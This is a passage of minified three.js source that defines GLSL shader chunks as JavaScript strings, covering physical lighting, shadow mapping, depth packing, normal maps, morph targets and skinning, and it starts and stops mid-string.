RE_Direct\\t\\t\\t\\tRE_Direct_BlinnPhong\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_BlinnPhong\\n#define Material_LightProbeLOD( material )\\t(0)\\n\";\nTHREE.ShaderChunk.lights_physical_fragment=\"PhysicalMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\\n#ifdef STANDARD\\n\\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\\n#else\\n\\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\\n\\tmaterial.clearCoat = saturate( clearCoat );\\tmaterial.clearCoatRoughness = clamp( clearCoatRoughness, 0.04, 1.0 );\\n#endif\\n\";\nTHREE.ShaderChunk.lights_physical_pars_fragment=\"struct PhysicalMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tfloat\\tspecularRoughness;\\n\\tvec3\\tspecularColor;\\n\\t#ifndef STANDARD\\n\\t\\tfloat clearCoat;\\n\\t\\tfloat clearCoatRoughness;\\n\\t#endif\\n};\\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\\n\\tvec3 irradiance = dotNL * directLight.color;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treflectedLight.directSpecular += irradiance * BRDF_Specular_GGX( directLight, geometry, material.specularColor, material.specularRoughness );\\n\\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.directSpecular += irradiance * material.clearCoat * BRDF_Specular_GGX( directLight, geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\\n}\\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 clearCoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\\n\\treflectedLight.indirectSpecular += radiance * BRDF_Specular_GGX_Environment( geometry, material.specularColor, material.specularRoughness );\\n\\t#ifndef STANDARD\\n\\t\\treflectedLight.indirectSpecular += clearCoatRadiance * material.clearCoat * BRDF_Specular_GGX_Environment( geometry, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearCoatRoughness );\\n\\t#endif\\n}\\n#define RE_Direct\\t\\t\\t\\tRE_Direct_Physical\\n#define RE_IndirectDiffuse\\t\\tRE_IndirectDiffuse_Physical\\n#define RE_IndirectSpecular\\t\\tRE_IndirectSpecular_Physical\\n#define Material_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.specularRoughness )\\n#define Material_ClearCoat_BlinnShininessExponent( material )   GGXRoughnessToBlinnExponent( material.clearCoatRoughness )\\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\\n\\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\\n}\\n\";\nTHREE.ShaderChunk.lights_template=\"\\nGeometricContext geometry;\\ngeometry.position = - vViewPosition;\\ngeometry.normal = normal;\\ngeometry.viewDir = normalize( vViewPosition );\\nIncidentLight directLight;\\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\\n\\t\\t#ifdef USE_SHADOWMAP\\n\\t\\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t\\t#endif\\n\\t\\tRE_Direct( directLight, geometry, material, reflectedLight );\\n\\t}\\n#endif\\n#if defined( RE_IndirectDiffuse )\\n\\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tlightMapIrradiance *= PI;\\n\\t\\t#endif\\n\\t\\tirradiance += lightMapIrradiance;\\n\\t#endif\\n\\t#if ( NUM_HEMI_LIGHTS > 0 )\\n\\t\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\t\\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t}\\n\\t#endif\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL ) && defined( ENVMAP_TYPE_CUBE_UV )\\n\\t \\tirradiance += getLightProbeIndirectIrradiance( geometry, 8 );\\n\\t#endif\\n\\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\\n#endif\\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\\n\\tvec3 radiance = getLightProbeIndirectRadiance( geometry, Material_BlinnShininessExponent( material ), 8 );\\n\\t#ifndef STANDARD\\n\\t\\tvec3 clearCoatRadiance = getLightProbeIndirectRadiance( geometry, Material_ClearCoat_BlinnShininessExponent( material ), 8 );\\n\\t#else\\n\\t\\tvec3 clearCoatRadiance = vec3( 0.0 );\\n\\t#endif\\n\\t\\t\\n\\tRE_IndirectSpecular( radiance, clearCoatRadiance, geometry, material, reflectedLight );\\n#endif\\n\";\nTHREE.ShaderChunk.logdepthbuf_fragment=\"#if defined(USE_LOGDEPTHBUF) && defined(USE_LOGDEPTHBUF_EXT)\\n\\tgl_FragDepthEXT = log2(vFragDepth) * logDepthBufFC * 0.5;\\n#endif\";THREE.ShaderChunk.logdepthbuf_pars_fragment=\"#ifdef USE_LOGDEPTHBUF\\n\\tuniform float logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.logdepthbuf_pars_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvarying float vFragDepth;\\n\\t#endif\\n\\tuniform float logDepthBufFC;\\n#endif\";\nTHREE.ShaderChunk.logdepthbuf_vertex=\"#ifdef USE_LOGDEPTHBUF\\n\\tgl_Position.z = log2(max( EPSILON, gl_Position.w + 1.0 )) * logDepthBufFC;\\n\\t#ifdef USE_LOGDEPTHBUF_EXT\\n\\t\\tvFragDepth = 1.0 + gl_Position.w;\\n\\t#else\\n\\t\\tgl_Position.z = (gl_Position.z - 1.0) * gl_Position.w;\\n\\t#endif\\n#endif\\n\";THREE.ShaderChunk.map_fragment=\"#ifdef USE_MAP\\n\\tvec4 texelColor = texture2D( map, vUv );\\n\\ttexelColor = mapTexelToLinear( texelColor );\\n\\tdiffuseColor *= texelColor;\\n#endif\\n\";\nTHREE.ShaderChunk.map_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform sampler2D map;\\n#endif\\n\";THREE.ShaderChunk.map_particle_fragment=\"#ifdef USE_MAP\\n\\tvec4 mapTexel = texture2D( map, vec2( gl_PointCoord.x, 1.0 - gl_PointCoord.y ) * offsetRepeat.zw + offsetRepeat.xy );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\";THREE.ShaderChunk.map_particle_pars_fragment=\"#ifdef USE_MAP\\n\\tuniform vec4 offsetRepeat;\\n\\tuniform sampler2D map;\\n#endif\\n\";THREE.ShaderChunk.metalnessmap_fragment=\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.r;\\n#endif\\n\";\nTHREE.ShaderChunk.metalnessmap_pars_fragment=\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\";THREE.ShaderChunk.morphnormal_vertex=\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\";\nTHREE.ShaderChunk.morphtarget_pars_vertex=\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\";THREE.ShaderChunk.morphtarget_vertex=\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.normal_flip=\"#ifdef DOUBLE_SIDED\\n\\tfloat flipNormal = ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n#else\\n\\tfloat flipNormal = 1.0;\\n#endif\\n\";THREE.ShaderChunk.normal_fragment=\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal ) * flipNormal;\\n#endif\\n#ifdef USE_NORMALMAP\\n\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\";\nTHREE.ShaderChunk.normalmap_pars_fragment=\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\tvec3 q0 = dFdx( eye_pos.xyz );\\n\\t\\tvec3 q1 = dFdy( eye_pos.xyz );\\n\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\tvec3 S = normalize( q0 * st1.t - q1 * st0.t );\\n\\t\\tvec3 T = normalize( -q0 * st1.s + q1 * st0.s );\\n\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\tmapN.xy = normalScale * mapN.xy;\\n\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\treturn normalize( tsn * mapN );\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.packing=\"vec3 packNormalToRGB( const in vec3 normal ) {\\n  return normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n  return 1.0 - 2.0 * rgb.xyz;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n  return ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n  return linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n  return (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n  return ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\";\nTHREE.ShaderChunk.premultiplied_alpha_fragment=\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\";THREE.ShaderChunk.project_vertex=\"#ifdef USE_SKINNING\\n\\tvec4 mvPosition = modelViewMatrix * skinned;\\n#else\\n\\tvec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\n#endif\\ngl_Position = projectionMatrix * mvPosition;\\n\";THREE.ShaderChunk.roughnessmap_fragment=\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.r;\\n#endif\\n\";\nTHREE.ShaderChunk.roughnessmap_pars_fragment=\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\";THREE.ShaderChunk.shadowmap_pars_fragment=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\\n\\t\\tbool inFrustum = all( inFrustumVec );\\n\\t\\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\\n\\t\\tbool frustumTest = all( frustumTestVec );\\n\\t\\tif ( frustumTest ) {\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\\n\\t\\t\\tfloat dx0 = - texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy0 = - texelSize.y * shadowRadius;\\n\\t\\t\\tfloat dx1 = + texelSize.x * shadowRadius;\\n\\t\\t\\tfloat dy1 = + texelSize.y * shadowRadius;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\\n\\t\\t\\t\\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\\n\\t\\t#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n\\t}\\n\\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\\n\\t\\tvec3 absV = abs( v );\\n\\t\\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\\n\\t\\tabsV *= scaleToCube;\\n\\t\\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\\n\\t\\tvec2 planar = v.xy;\\n\\t\\tfloat almostATexel = 1.5 * texelSizeY;\\n\\t\\tfloat almostOne = 1.0 - almostATexel;\\n\\t\\tif ( absV.z >= almostOne ) {\\n\\t\\t\\tif ( v.z > 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowBias ) / 1000.0;\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmap_pars_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmap_vertex=\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.shadowmask_pars_fragment=\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\";\nTHREE.ShaderChunk.skinbase_vertex=\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\";THREE.ShaderChunk.skinning_pars_vertex=\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureWidth;\\n\\t\\tuniform int boneTextureHeight;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureWidth ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureWidth ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureWidth );\\n\\t\\t\\tfloat dy = 1.0 